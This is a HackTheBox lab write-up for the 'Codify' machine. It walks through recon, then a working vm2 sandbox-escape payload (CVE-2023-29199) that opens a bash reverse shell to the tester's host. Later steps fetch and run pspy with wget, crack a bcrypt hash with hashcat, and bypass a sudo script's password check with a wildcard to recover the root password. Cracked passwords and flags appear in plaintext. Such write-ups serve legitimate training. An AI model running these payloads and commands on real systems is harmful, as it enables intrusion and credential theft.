---
render_with_liquid: false
title: HackTheBox Writeup  Codify
date: 2023-11-05 03:09:41 +1400
tags: [hackthebox, nmap, linux, feroxbuster, nodejs, vm2, sandbox-escape, cve-2023-29199, discover-secrets, hashcat, password-reuse, sudo, bash-script, bash-condition-bypass, pspy]
---



Codify is an easy Linux machine that features a web application that allows users to test `Node.js` code. The application uses a vulnerable `vm2` library, which is leveraged to gain remote code execution. Enumerating the target reveals a `SQLite` database containing a hash which, once cracked, yields `SSH` access to the box. Finally, a vulnerable `Bash` script can be run with elevated privileges to reveal the `root` user&amp;#039;s password, leading to privileged access to the machine.


# Recon
---

```bash
┌──(bravosec㉿fsociety)-[~/htb/Codify]
└─$ pt init '10.129.48.58 codify.htb'
+---------+--------+--------------+------------+
| PROFILE | STATUS |      IP      |   DOMAIN   |
+---------+--------+--------------+------------+
| codify  | on     | 10.129.48.58 | codify.htb |
+---------+--------+--------------+------------+
```

## Nmap

```bash

# Nmap 7.94 scan initiated Sun Nov  5 03:09:40 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80,3000 10.129.48.58
Nmap scan report for 10.129.48.58
Host is up, received user-set (0.080s latency).
Scanned at 2023-11-05 03:09:41 CST for 14s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN+/g3FqMmVlkT3XCSMH/JtvGJDW3+PBxqJ+pURQey6GMjs7abbrEOCcVugczanWj1WNU5jsaYzlkCEZHlsHLvk=
|   256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIm6HJTYy2teiiP6uZoSCHhsWHN+z3SVL/21fy6cZWZi
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
|_http-title: Codify
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun Nov  5 03:09:55 2023 -- 1 IP address (1 host up) scanned in 14.83 seconds
```

## Scripts

Port `3000` share the same hash with `80`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Codify]
└─$ webprobe
http://codify.htb [200] [Codify] [Apache/2.4.52 (Ubuntu)] [Apache HTTP Server:2.4.52,Bootstrap:4.3.1,Express,Node.js,Ubuntu] [4b63413e7dcfd0929b55ecaccd36a2b8e7e8a507]
http://codify.htb:3000 [200] [Codify] [] [Bootstrap:4.3.1,Express,Node.js] [4b63413e7dcfd0929b55ecaccd36a2b8e7e8a507]
```

## 80 - HTTP : Codify Online Node JS sandbox

### Info

![](/assets/obsidian/cf193dcc73567ef671e1878b70b0e400.png)

### Directory

```bash
feroxbuster -t 150 -o ferox_80.txt -u 'http://codify.htb/'
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Codify]
└─$ cat ferox_80.txt
200      GET       50l      282w     2921c http://codify.htb/about
200      GET      119l      246w     3123c http://codify.htb/editor
200      GET       61l      199w     2665c http://codify.htb/limitations
200      GET       38l      239w     2269c http://codify.htb/
200      GET      119l      246w     3123c http://codify.htb/Editor
200      GET       50l      282w     2921c http://codify.htb/About
403      GET        9l       28w      275c http://codify.htb/server-status
200      GET       50l      282w     2921c http://codify.htb/ABOUT
```


# User Flag
---

## Shell as svc


### Sandbox Escape in vm2@3.9.16 (CVE-2023-29199)

In about page, **vm2** with version 3.9.16 was disclosed

![](/assets/obsidian/0f9c55fdefa29ab7446d897f585d647f.png)

Google : `vm2 3.9.16 exploit`

> https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244

![](/assets/obsidian/49484794196f6ebdd99fe919d175a79b.png)

Payload :

```bash
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync( 'bash -c "bash -i >& /dev/tcp/10.10.16.30/1111 0>&1"');
}
`

console.log(vm.run(code));
```

> http://10.129.48.58:3000/editor

![](/assets/obsidian/64f5fd0be75e71d234639306b0490240.png)

```bash
┌──(bravosec㉿fsociety)-[~/htb/Codify]
└─$ nc -lvnp 1111
listening on [any] 1111 ...
connect to [10.10.16.30] from (UNKNOWN) [10.129.48.58] 50848
bash: cannot set terminal process group (1236): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
svc@codify:~$ ^Z
zsh: suspended  nc -lvnp 1111

┌──(bravosec㉿fsociety)-[~/htb/Codify]
└─$ stty raw -echo;fg
[1]  + continued  nc -lvnp 1111

svc@codify:~$ export TERM=xterm
svc@codify:~$ id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
svc@codify:~$ cat user.txt
cat: user.txt: No such file or directory
```

## From svc to joshua


### Enum

There's another user `joshua`

```bash
svc@codify:~$ cat /etc/passwd|grep sh$
root:x:0:0:root:/root:/bin/bash
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
```

`svc` is a service account that runs the Node JS sandbox wepapp

```bash
svc@codify:~$ find . -ls
...
   170317      4 -rw-rw-r--   1 svc      svc          1466 Nov  5 06:32 ./.pm2/logs/index-error-5.log
   170316      4 -rw-rw-r--   1 svc      svc           507 Nov  4 19:06 ./.pm2/logs/index-out-5.log
   170284      0 -rw-rw-r--   1 svc      svc             0 Sep 12 17:19 ./.pm2/logs/index-error-2.log
   170272     72 -rw-rw-r--   1 svc      svc         66916 Nov  4 19:06 ./.pm2/pm2.log
...
```

```bash
svc@codify:~$ pm2 ls
┌────┬──────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐
│ id │ name     │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │
├────┼──────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤
│ 0  │ index    │ default     │ N/A     │ cluster │ 1355     │ 11h    │ 0    │ online    │ 0%       │ 83.0mb   │ svc      │ disabled │
│ 1  │ index    │ default     │ N/A     │ cluster │ 1358     │ 11h    │ 0    │ online    │ 0%       │ 77.1mb   │ svc      │ disabled │
│ 2  │ index    │ default     │ N/A     │ cluster │ 1411     │ 11h    │ 0    │ online    │ 0%       │ 68.7mb   │ svc      │ disabled │
│ 3  │ index    │ default     │ N/A     │ cluster │ 1415     │ 11h    │ 0    │ online    │ 0%       │ 83.1mb   │ svc      │ disabled │
│ 4  │ index    │ default     │ N/A     │ cluster │ 1438     │ 11h    │ 0    │ online    │ 0%       │ 70.6mb   │ svc      │ disabled │
│ 5  │ index    │ default     │ N/A     │ cluster │ 1489     │ 11h    │ 0    │ online    │ 0%       │ 63.8mb   │ svc      │ disabled │
│ 6  │ index    │ default     │ N/A     │ cluster │ 1492     │ 11h    │ 0    │ online    │ 0%       │ 68.8mb   │ svc      │ disabled │
│ 7  │ index    │ default     │ N/A     │ cluster │ 1526     │ 11h    │ 0    │ online    │ 0%       │ 70.0mb   │ svc      │ disabled │
│ 8  │ index    │ default     │ N/A     │ cluster │ 1532     │ 11h    │ 0    │ online    │ 0%       │ 72.3mb   │ svc      │ disabled │
│ 9  │ index    │ default     │ N/A     │ cluster │ 1539     │ 11h    │ 0    │ online    │ 0%       │ 76.2mb   │ svc      │ disabled │
└────┴──────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘
```

```bash
svc@codify:~$ pm2 describe 0
 Describing process with id 0 - name index
┌───────────────────┬───────────────────────────────────────┐
│ status            │ online                                │
│ name              │ index                                 │
│ namespace         │ default                               │
│ version           │ N/A                                   │
│ restarts          │ 0                                     │
│ uptime            │ 36m                                   │
│ script path       │ /var/www/editor/index.js              │
│ script args       │ N/A                                   │
│ error log path    │ /home/svc/.pm2/logs/index-error-0.log │
│ out log path      │ /home/svc/.pm2/logs/index-out-0.log   │
│ pid path          │ /home/svc/.pm2/pids/index-0.pid       │
│ interpreter       │ node                                  │
│ interpreter args  │ N/A                                   │
│ script id         │ 0                                     │
│ exec cwd          │ /home/svc                             │
│ exec mode         │ cluster_mode                          │
│ node.js version   │ 18.17.1                               │
│ node env          │ N/A                                   │
│ watch & reload    │ ✘                                     │
│ unstable restarts │ 0                                     │
│ created at        │ 2023-09-12T17:19:27.612Z              │
└───────────────────┴───────────────────────────────────────┘
```

`contact` is the only web app that isn't publicly accessible

```bash
svc@codify:~$ cd /var/www
svc@codify:/var/www$ ls -latr
total 20
drwxr-xr-x  2 svc  svc  4096 Apr 12  2023 html
drwxr-xr-x  5 root root 4096 Sep 12 17:40 .
drwxr-xr-x  3 svc  svc  4096 Sep 12 17:45 contact
drwxr-xr-x  4 svc  svc  4096 Sep 12 17:46 editor
drwxr-xr-x 13 root root 4096 Oct 31 07:57 ..
```

### joshua's credential in sqlite db

A table with password is in `contact/tickets.db`, using **bcrypt**

```bash
svc@codify:/var/www$ grep -RinaE 'passw|pwd'
...
contact/tickets.db:4:        password TEXT
contact/index.js:11:db.run('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT)');
contact/index.js:70:        const password = formData.get('password');
contact/index.js:72:        db.get('SELECT id, username, password FROM users WHERE username = ?', [username], (err, row) => {
contact/index.js:84:            // check the password hash
contact/index.js:85:            bcrypt.compare(password, row.password, (err, result) => {
```

```bash
svc@codify:/var/www/contact$ sqlite3 tickets.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
tickets  users
sqlite> .headers on
sqlite> .mode columns
sqlite> select * from users;
id  username  password
--  --------  ------------------------------------------------------------
3   joshua    $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

### Crack bcrypt hashes from users table

```bash
┌──(bravosec㉿fsociety)-[~/htb/Codify/loot]
└─$ vi tickets.db.users
3   joshua    $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Codify/loot]
└─$ cat tickets.db.users|awk '{print $2":"$3}'|tee tickets.db.users.hash
joshua:$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Codify/loot]
└─$ hashcat tickets.db.users.hash /opt/wordlists/rockyou.txt --user -m 3200 

┌──(bravosec㉿fsociety)-[~/htb/Codify/loot]
└─$ hashcat tickets.db.users.hash /opt/wordlists/rockyou.txt --user -m 3200 --show
joshua:$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1
```

### SSH as joshua

```bash
┌──(bravosec㉿fsociety)-[~/htb/Codify/loot]
└─$ cssh joshua@codify.htb 'spongebob1'
Warning: Permanently added 'codify.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Nov  5 07:11:20 AM UTC 2023

  System load:                      0.04150390625
  Usage of /:                       69.3% of 6.50GB
  Memory usage:                     32%
  Swap usage:                       0%
  Processes:                        256
  Users logged in:                  0
  IPv4 address for br-030a38808dbf: 172.18.0.1
  IPv4 address for br-5ab86a4e40d0: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.48.58
  IPv6 address for eth0:            dead:beef::250:56ff:feb9:db04


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sat Nov  4 20:07:56 2023 from 10.10.16.30
joshua@codify:~$ id
uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)
joshua@codify:~$ cat user.txt
76321d4b914f73f5b54f85f720e1689f
```

# Root Flag
---

## From joshua to root


### Capture mysql credential via pspy

```bash
joshua@codify:~$ sudo -l
[sudo] password for joshua:
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

```bash
joshua@codify:~$ cat /opt/scripts/mysql-backup.sh

#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

> **Foothold**
> The password was stored at `/root/.creds`, if user inputs the right password, the script will backup all databases from mysql as root
> 
> In order to get `$DB_PASS` that was passed to command line, we can bypass password check with asterisks/wild card (`*`)
{: .prompt-info }

Start **pspy** first

```bash
cssh joshua@codify.htb 'spongebob1'
wget 10.10.16.30/pspy64 -O /dev/shm/pspy && chmod +x /dev/shm/pspy && /dev/shm/pspy
```

Trigger the command

```bash
joshua@codify:~$ sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: *
Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
```

> If the command line wasn't captured by **pspy**, just run the script several times till it shows up
{: .prompt-tip }

![](/assets/obsidian/0b56f5b2295055d7c57a39b21cd60daf.png)

### Shell as root

Password reuse

```bash
joshua@codify:/opt/scripts$ su - root
Password:kljh12k3jhaskjh12kjh3
root@codify:~# id
uid=0(root) gid=0(root) groups=0(root)
root@codify:~# cat root.txt
60ad7a08f30f86be7a125787d796508d
```

![](/assets/obsidian/b986f9f46e62a50f9440d85e1164ba94.png)

# Additional
---
